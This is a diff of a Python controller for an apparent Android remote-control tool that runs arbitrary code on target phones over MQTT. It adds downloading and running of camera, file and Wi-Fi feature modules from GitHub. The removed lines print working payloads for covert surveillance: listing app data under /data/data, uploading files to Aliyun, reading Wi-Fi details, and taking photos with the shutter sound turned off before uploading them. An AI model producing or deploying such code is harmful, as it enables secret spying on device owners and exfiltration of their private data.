@@ -2,28 +2,76 @@
 
 import json
 import base64
+import copy
 import importlib
+import importlib.util
 import os
 import sys
 import threading
+import uuid
 from pathlib import PurePosixPath
 
 import time
-_STATE = {"files_dir": None, "lock": threading.RLock()}
+_STATE = {
+    "files_dir": None,
+    "lock": threading.RLock(),
+    "selected_topic": None,
+    "selected_device_id": None,
+    "last_config": None,
+    "operation_logs": [],
+}
 _DEFAULT_DEVICE = {
     "name": "Target",
     "request_topic": "sys/device/request",
     "private_key": "",
     "allow_no_server_pubkey_response": True,
     "timeout": 10,
+    "remote_root": "/data/data",
+    "aliyun": {},
 }
 _CONFIG_NAME = "client_mqtt.json"
+_BUILTIN_FEATURE_SOURCES = {
+    "feature_files.py": (
+        "https://github.com/cjqbj/client_mqtt-cjqbj/raw/refs/heads/main/app/src/main/python/feature_files.py",
+        "https://raw.githubusercontent.com/cjqbj/client_mqtt-cjqbj/main/app/src/main/python/feature_files.py",
+    ),
+    "feature_camera.py": (
+        "https://github.com/cjqbj/client_mqtt-cjqbj/raw/refs/heads/main/app/src/main/python/feature_camera.py",
+        "https://raw.githubusercontent.com/cjqbj/client_mqtt-cjqbj/main/app/src/main/python/feature_camera.py",
+    ),
+    "feature_wifi.py": (
+        "https://github.com/cjqbj/client_mqtt-cjqbj/raw/refs/heads/main/app/src/main/python/feature_wifi.py",
+        "https://raw.githubusercontent.com/cjqbj/client_mqtt-cjqbj/main/app/src/main/python/feature_wifi.py",
+    ),
+}
 
 
 def call_feature(feature, action="run", *args):
     """Dispatch through the stable bootstrap so feature modules can be replaced."""
     import bootstrap
     return bootstrap.call_feature(feature, action, *args)
+
+
+def _mqtt_client_module():
+    module_dir = os.path.join(os.path.dirname(__file__), "multi_mqtt")
+    source_file = os.path.join(module_dir, "multi_mqtt.py")
+    if module_dir not in sys.path:
+        sys.path.insert(0, module_dir)
+    package = sys.modules.get("multi_mqtt")
+    package_file = os.path.abspath(str(getattr(package, "__file__", "")))
+    if package_file != os.path.abspath(source_file) or not hasattr(package, "MultiMQTTManager"):
+        for name in tuple(sys.modules):
+            if name == "multi_mqtt" or name.startswith("multi_mqtt."):
+                sys.modules.pop(name, None)
+        spec = importlib.util.spec_from_file_location(
+            "multi_mqtt", source_file, submodule_search_locations=[module_dir]
+        )
+        if spec is None or spec.loader is None:
+            raise ImportError(f"Unable to load MQTT library from {source_file}")
+        package = importlib.util.module_from_spec(spec)
+        sys.modules["multi_mqtt"] = package
+        spec.loader.exec_module(package)
+    return importlib.import_module("multi_mqtt.client_mqtt")
 
 
 def feature_catalog():
@@ -36,33 +84,201 @@ def install_feature(url, filename, sha256=""):
     return bootstrap.install_feature(url, filename, sha256)
 
 
+def _append_operation_log(message):
+    entry = f"{time.strftime('%H:%M:%S')} {message}"
+    with _STATE["lock"]:
+        logs = _STATE.setdefault("operation_logs", [])
+        logs.append(entry)
+        del logs[:-200]
+    return entry
+
+
+def operation_logs():
+    with _STATE["lock"]:
+        return json.dumps(list(_STATE.get("operation_logs", [])), ensure_ascii=False)
+
+
+def install_builtin_features(script_root, retries=4, timeout=15):
+    """Install missing bundled feature scripts into a chosen script root."""
+    import bootstrap
+
+    update_dir = os.path.join(os.path.abspath(str(script_root)), "py_updates")
+    os.makedirs(update_dir, exist_ok=True)
+    with _STATE["lock"]:
+        _STATE.setdefault("operation_logs", []).clear()
+    _append_operation_log(f"Installing built-in features into {update_dir}")
+    results = []
+
+    for filename, urls in _BUILTIN_FEATURE_SOURCES.items():
+        destination = os.path.join(update_dir, filename)
+        if os.path.isfile(destination):
+            try:
+                with open(destination, "rb") as feature_file:
+                    compile(feature_file.read(), filename, "exec")
+                _append_operation_log(f"{filename}: already present; skipped")
+                results.append({"filename": filename, "ok": True, "skipped": True})
+                continue
+            except (OSError, SyntaxError):
+                _append_operation_log(f"{filename}: existing file is invalid; downloading replacement")
+
+        try:
+            result = bootstrap.install_feature(
+                urls[0],
+                filename,
+                update_dir=update_dir,
+                retries=retries,
+                timeout=timeout,
+                fallback_urls=urls[1:],
+                progress=_append_operation_log,
+            )
+            results.append(result)
+        except Exception as error:
+            detail = f"{type(error).__name__}: {error}"[:300]
+            _append_operation_log(f"{filename}: failed: {detail}")
+            results.append({"filename": filename, "ok": False, "error": detail})
+
+    installed = sum(bool(item.get("ok")) for item in results)
+    _append_operation_log(f"Finished: {installed}/{len(results)} feature files ready")
+    return json.dumps({
+        "ok": installed == len(results),
+        "update_dir": update_dir,
+        "results": results,
+        "logs": json.loads(operation_logs()),
+    }, ensure_ascii=False)
+
+
 def initialize(files_dir):
     _STATE["files_dir"] = str(files_dir)
     path = os.path.join(_STATE["files_dir"], _CONFIG_NAME)
     _STATE["config_path"] = path
     if not os.path.isfile(path):
         save_config({"devices": [_DEFAULT_DEVICE.copy()], "scan_limit": 100, "remote_root": "/data/data"})
+    with _STATE["lock"]:
+        config = load_config()
+        devices = [item for item in config.get("devices", []) if isinstance(item, dict)]
+        if not devices:
+            devices = [_DEFAULT_DEVICE.copy()]
+        for device in devices:
+            device.setdefault("id", uuid.uuid4().hex)
+            device.setdefault("remote_root", config.get("remote_root", "/data/data"))
+            device.setdefault("aliyun", config.get("aliyun", {}))
+        config["devices"] = devices
+        config.pop("remote_root", None)
+        config.pop("aliyun", None)
+        save_config(config)
+        _STATE["selected_device_id"] = devices[0]["id"]
+        _STATE["selected_topic"] = devices[0].get("request_topic", _DEFAULT_DEVICE["request_topic"])
     return {"ok": True, "files_dir": _STATE["files_dir"]}
 
 
 def update_settings(values):
+    with _STATE["lock"]:
+        config = load_config()
+        if isinstance(values, str):
+            values = json.loads(values)
+        config.update(dict(values or {}))
+        save_config(config)
+        return json.dumps(config, ensure_ascii=False)
+
+
+def device_catalog():
     config = load_config()
+    devices = config.get("devices") or [_DEFAULT_DEVICE.copy()]
+    changed = False
+    for device in devices:
+        if not device.get("id"):
+            device["id"] = uuid.uuid4().hex
+            changed = True
+        device.setdefault("remote_root", config.get("remote_root", "/data/data"))
+        device.setdefault("aliyun", config.get("aliyun", {}))
+    if changed:
+        config["devices"] = devices
+        save_config(config)
+    return json.dumps(devices, ensure_ascii=False)
+
+
+def device_settings(device_ref=None):
+    selected = _device_config(device_ref)
+    return json.dumps(selected, ensure_ascii=False)
+
+
+def select_device(device_ref):
+    selected = _device_config(device_ref)
+    _STATE["selected_device_id"] = selected["id"]
+    _STATE["selected_topic"] = selected["request_topic"]
+    return json.dumps({"ok": True, "device": selected}, ensure_ascii=False)
+
+
+def update_device_settings(existing_device, values):
     if isinstance(values, str):
         values = json.loads(values)
-    config.update(dict(values or {}))
-    save_config(config)
-    return json.dumps(config, ensure_ascii=False)
+    if not isinstance(values, dict):
+        raise ValueError("device settings must be a JSON object")
+    values = dict(values)
+    request_topic = str(values.get("request_topic", "")).strip()
+    if not request_topic:
+        raise ValueError("request_topic is required")
+    aliyun = values.get("aliyun", {})
+    if not isinstance(aliyun, dict):
+        raise ValueError("aliyun must be a JSON object")
+    aliyun_draft = values.pop("aliyun_json_draft", None)
+    if aliyun_draft is not None and not isinstance(aliyun_draft, str):
+        raise ValueError("aliyun_json_draft must be a string")
+    timeout_draft = values.pop("timeout_draft", None)
+    if timeout_draft is not None and not isinstance(timeout_draft, str):
+        raise ValueError("timeout_draft must be a string")
+
+    with _STATE["lock"]:
+        config = load_config()
+        devices = config.get("devices") or []
+        selected = next((
+            device for device in devices
+            if device.get("id") == existing_device or device.get("request_topic") == existing_device
+        ), None)
+        if selected is None:
+            selected = _DEFAULT_DEVICE.copy()
+            selected["id"] = uuid.uuid4().hex
+            devices.append(selected)
+        selected.update(values)
+        selected["id"] = selected.get("id") or uuid.uuid4().hex
+        selected["request_topic"] = request_topic
+        selected["name"] = str(values.get("name") or request_topic.rsplit("/", 1)[-1])
+        selected["remote_root"] = str(values.get("remote_root", "/data/data"))
+        if "aliyun" in values:
+            selected["aliyun"] = aliyun
+        else:
+            selected.setdefault("aliyun", {})
+        if aliyun_draft is None:
+            selected.pop("aliyun_json_draft", None)
+        else:
+            selected["aliyun_json_draft"] = aliyun_draft
+        if timeout_draft is None:
+            selected.pop("timeout_draft", None)
+        else:
+            selected["timeout_draft"] = timeout_draft
+        config["devices"] = devices
+        save_config(config)
+        _STATE["selected_device_id"] = selected["id"]
+        _STATE["selected_topic"] = request_topic
+        return json.dumps(selected, ensure_ascii=False)
 
 
 def load_config():
     path = _STATE.get("config_path")
     if not path or not os.path.isfile(path):
         return {"devices": [_DEFAULT_DEVICE.copy()], "scan_limit": 100, "remote_root": "/data/data"}
-    try:
-        with open(path, "r", encoding="utf-8") as config_file:
-            value = json.load(config_file)
-        return value if isinstance(value, dict) else {}
-    except (OSError, ValueError):
+    with _STATE["lock"]:
+        try:
+            with open(path, "r", encoding="utf-8") as config_file:
+                value = json.load(config_file)
+            if isinstance(value, dict):
+                _STATE["last_config"] = copy.deepcopy(value)
+                return value
+        except (OSError, ValueError):
+            pass
+        previous = _STATE.get("last_config")
+        if isinstance(previous, dict):
+            return copy.deepcopy(previous)
         return {"devices": [_DEFAULT_DEVICE.copy()], "scan_limit": 100, "remote_root": "/data/data"}
 
 
@@ -70,18 +286,25 @@ def save_config(value):
     path = _STATE.get("config_path")
     if not path:
         return {"ok": False, "error": "service is not initialized"}
-    os.makedirs(os.path.dirname(path), exist_ok=True)
-    temporary = path + ".tmp"
-    with open(temporary, "w", encoding="utf-8") as config_file:
-        json.dump(value, config_file, ensure_ascii=False, indent=2)
-    os.replace(temporary, path)
+    with _STATE["lock"]:
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        temporary = path + ".tmp"
+        with open(temporary, "w", encoding="utf-8") as config_file:
+            json.dump(value, config_file, ensure_ascii=False, indent=2)
+        os.replace(temporary, path)
+        _STATE["last_config"] = copy.deepcopy(value)
     return {"ok": True}
 
 
 def _device_config(device=None):
     config = load_config()
     devices = config.get("devices") or [_DEFAULT_DEVICE.copy()]
-    selected = device or devices[0]
+    device_ref = device or _STATE.get("selected_device_id") or _STATE.get("selected_topic")
+    selected = next((
+        item for item in devices
+        if item.get("id") == device_ref or item.get("request_topic") == device_ref
+    ), None)
+    selected = selected or devices[0]
     merged = _DEFAULT_DEVICE.copy()
     merged.update(selected)
     return merged
@@ -89,10 +312,15 @@ def _device_config(device=None):
 
 def rpc(code, device=None):
     """Execute short control code through the existing MQTT racing client."""
-    from multi_mqtt import client_mqtt
-
+    client_mqtt = _mqtt_client_module()
     selected = _device_config(device)
     private_key = selected.get("private_key") or None
+    aliyun = json.dumps(selected.get("aliyun") or {}, ensure_ascii=False)
+    code = (
+        "import sys\n"
+        f"sys.__dict__.setdefault('_qgb_dict', {{}}).setdefault('aliyun_git', {{}}).update({aliyun})\n"
+        + code
+    )
     started = time.perf_counter()
     response = client_mqtt.rpc(
         code,
@@ -112,29 +340,6 @@ def online(device=None):
     return json.dumps({"ok": bool(result.get("ok")), "result": result}, ensure_ascii=False)
 
 
-def scan_remote(root, offset=0, limit=100, device=None):
-    result = parse_json_result(rpc(build_scan_code(root, offset, limit), device))
-    return json.dumps(result, ensure_ascii=False)
-
-
-def build_upload_code(remote_path, aliyun_config=None):
-    """Build target code which uploads a file without returning its bytes via MQTT."""
-    path_value = json.dumps(str(remote_path), ensure_ascii=False)
-    return f'''import json
-import aliyun_git
-path = {path_value}
-try:
-    url = aliyun_git.upload(path, file_path=path.rsplit("/", 1)[-1])
-    r = json.dumps({{"ok": True, "url": url, "name": path.rsplit("/", 1)[-1]}}, ensure_ascii=False)
-except Exception as exc:
-    r = json.dumps({{"ok": False, "error": repr(exc)}}, ensure_ascii=False)
-'''
-
-
-def upload_remote(remote_path, device=None):
-    return parse_json_result(rpc(build_upload_code(remote_path), device))
-
-
 def _set_aliyun_config(config):
     safe_config = dict(config or {})
     sys.__dict__.setdefault("_qgb_dict", {}).setdefault("aliyun_git", {}).update(safe_config)
@@ -151,7 +356,7 @@ def download_transfer(url, config=None, save_to=None):
 
 def download_transfer_base64(url, config=None):
     """Download an image/file into memory for the Android bridge, never MQTT."""
-    _set_aliyun_config(config or load_config().get("aliyun", {}))
+    _set_aliyun_config(config or _device_config().get("aliyun", {}))
     aliyun_git = importlib.import_module("aliyun_git")
     data = aliyun_git.download(url, max_show_bytes_size=0)
     return base64.b64encode(bytes(data)).decode("ascii")
@@ -165,119 +370,6 @@ def download_remote_to_file(url, name, config=None):
     target = os.path.join(target_dir, safe_name)
     result = download_transfer(url, config=config, save_to=target)
     return json.dumps(result, ensure_ascii=False)
-
-
-def build_wifi_code():
-    return '''import json
-from android.content import Context
-from android.text.format import Formatter
-from com.chaquo.python import Python
-app = Python.getPlatform().getApplication()
-info = app.getSystemService(Context.WIFI_SERVICE).getConnectionInfo()
-ssid = info.getSSID()
-r = json.dumps({"ok": True, "wifi": {"ssid": ssid.strip('"') if ssid else None,
-    "bssid": str(info.getBSSID()) if info.getBSSID() else None,
-    "rssi": info.getRssi(), "link_speed": info.getLinkSpeed(),
-    "frequency": info.getFrequency(), "ip": Formatter.formatIpAddress(info.getIpAddress())}}, ensure_ascii=False)
-'''
-
-
-def build_photo_code(facing=0, aliyun_config=None):
-    return f'''import json, time
-from android.hardware import Camera
-from android.graphics import SurfaceTexture
-from java import dynamic_proxy
-import aliyun_git
-
-class PhotoCallback(dynamic_proxy(Camera.PictureCallback)):
-    def __init__(self):
-        super().__init__()
-        self.data = None
-    def onPictureTaken(self, data, camera):
-        if data is not None:
-            self.data = bytes(data)
-
-camera = None
-callback = PhotoCallback()
-try:
-    for _ in range(3):
-        try:
-            camera = Camera.open({int(facing)})
-            break
-        except Exception:
-            time.sleep(0.5)
-    if camera is None:
-        raise RuntimeError("camera open failed")
-    try:
-        camera.enableShutterSound(False)
-    except Exception:
-        pass
-    camera.setPreviewTexture(SurfaceTexture(10))
-    camera.startPreview()
-    time.sleep(1.0)
-    camera.takePicture(None, None, callback)
-    started = time.time()
-    while callback.data is None and time.time() - started < 8:
-        time.sleep(0.1)
-    if callback.data is None:
-        raise TimeoutError("camera capture timeout")
-    url = aliyun_git.upload(callback.data, file_path="photo_" + str(int(time.time() * 1000)) + ".jpg")
-    r = json.dumps({{"ok": True, "url": url, "size": len(callback.data), "facing": {int(facing)}}}, ensure_ascii=False)
-except Exception as exc:
-    r = json.dumps({{"ok": False, "error": repr(exc)}}, ensure_ascii=False)
-finally:
-    if camera is not None:
-        try: camera.stopPreview()
-        except Exception: pass
-        try: camera.release()
-        except Exception: pass
-'''
-
-
-def build_scan_code(root, offset=0, limit=100, recursive=True):
-    """Build bounded target code; the result is always an explicit JSON string."""
-    root_value = json.dumps(str(root), ensure_ascii=False)
-    offset_value = max(0, int(offset))
-    limit_value = max(1, min(int(limit), 10000))
-    recursive_value = bool(recursive)
-    return f'''import json, os
-root = os.path.abspath({root_value})
-start = {offset_value}
-limit = {limit_value}
-recursive = {recursive_value!r}
-items = []
-errors = []
-has_more = False
-base = os.path.realpath(root)
-if not os.path.isdir(root):
-    r = json.dumps({{"ok": False, "error": "root is not a directory", "root": root}}, ensure_ascii=False)
-else:
-    for current, dirs, names in os.walk(root, followlinks=False):
-        dirs.sort()
-        names.sort()
-        current_real = os.path.realpath(current)
-        if not (current_real == base or current_real.startswith(base + os.sep)):
-            dirs[:] = []
-            continue
-        dirs[:] = [d for d in dirs if not os.path.islink(os.path.join(current, d))]
-        for name in names:
-            path = os.path.join(current, name)
-            try:
-                real = os.path.realpath(path)
-                if not (real == base or real.startswith(base + os.sep)):
-                    continue
-                stat = os.stat(path, follow_symlinks=False)
-                if len(items) >= start + limit:
-                    has_more = True
-                    break
-                if len(items) >= start:
-                    items.append({{"path": os.path.relpath(path, root), "kind": "file", "size": stat.st_size, "modified": stat.st_mtime}})
-            except OSError as exc:
-                errors.append({{"path": os.path.relpath(path, root), "error": repr(exc)}})
-        if has_more or not recursive:
-            break
-    r = json.dumps({{"ok": True, "root": root, "items": items, "errors": errors, "has_more": has_more, "next_offset": start + len(items)}}, ensure_ascii=False)
-'''
 
 
 def parse_json_result(response):
